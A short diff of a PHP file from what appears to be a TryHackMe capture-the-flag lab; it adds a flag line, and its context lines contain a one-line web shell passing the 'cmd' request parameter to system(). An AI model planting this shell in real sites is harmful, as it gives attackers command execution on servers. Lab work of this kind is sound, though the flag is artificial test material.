@@ -2,3 +2,4 @@
 if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); }
 echo "AAAABBBBCCCCDDDD";
 ?>
+THM{hash_puppies_4_all}
